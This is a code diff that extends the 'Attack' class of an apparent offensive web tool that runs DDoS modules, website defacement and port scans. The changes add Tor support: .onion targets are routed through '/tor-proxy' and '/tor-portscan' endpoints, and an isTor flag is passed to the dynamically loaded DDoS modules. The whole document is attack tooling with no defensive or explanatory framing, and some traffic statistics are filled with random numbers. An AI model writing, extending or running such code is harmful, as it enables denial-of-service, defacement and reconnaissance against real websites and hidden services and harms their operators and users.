@@ -18,6 +18,7 @@ class Attack {
     this.errorThreshold = 5;
     this.maxRetries = 3;
     this.currentRetry = 0;
+    this.isTor = this.target.includes('.onion');
   }
 
   async start() {
@@ -82,7 +83,7 @@ class Attack {
 
     try {
       const ddosModule = await import(`./ddos/${ddosType}.js`);
-      this.ddosAttack = new ddosModule.default(this.target, this.options);
+      this.ddosAttack = new ddosModule.default(this.target, this.options, this.isTor);
       this.attackInstance = this.ddosAttack;
 
       this.stats.status = 'DDoSing';
@@ -96,7 +97,23 @@ class Attack {
   async executeDefacement() {
     this.stats.status = 'Preparing Defacement';
     try {
-      const response = await fetch(this.target, { mode: 'cors' });
+      let response;
+      if (this.isTor) {
+        response = await fetch('/tor-proxy', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            target: this.target
+          })
+        });
+      } else {
+        response = await fetch(this.target, {
+          mode: 'cors'
+        });
+      }
+
       if (!response.ok) {
         this.stats.status = 'Unresponsive';
         this.handleAttackError(new Error(`Target unresponsive: ${response.status}`));
@@ -157,7 +174,12 @@ class Attack {
 
       this.stats.status = `Scanning Port ${port}`;
       try {
-        const response = await fetch(`/portscan?target=${this.target}&port=${port}`);
+        let response;
+        if (this.isTor) {
+          response = await fetch(`/tor-portscan?target=${this.target}&port=${port}`);
+        } else {
+          response = await fetch(`/portscan?target=${this.target}&port=${port}`);
+        }
         const data = await response.json();
         if (data.open) {
           console.log(`Port ${port} is open`);
@@ -180,7 +202,10 @@ class Attack {
     this.stats.mbps = Math.random() * 15;
     this.stats.packetsSent += Math.floor(Math.random() * 1500);
 
-    fetch(this.target, { mode: 'no-cors' })
+    const corsMode = this.isTor ? 'no-cors' : 'cors';
+    fetch(this.target, {
+        mode: corsMode
+      })
       .then(response => {
         this.stats.status = response.ok ? 'Online' : 'Unresponsive';
       })
